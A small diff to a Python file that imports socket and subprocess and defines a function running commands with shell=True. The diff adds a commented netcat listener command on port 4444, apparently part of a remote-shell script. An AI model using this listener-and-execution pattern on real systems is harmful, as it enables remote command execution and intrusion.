@@ -1,6 +1,7 @@
 import socket 
 import subprocess
 
+# nc -vv -l -p 4444
 
 def execute_system_command(command):
     return subprocess.check_output(command, shell=True)
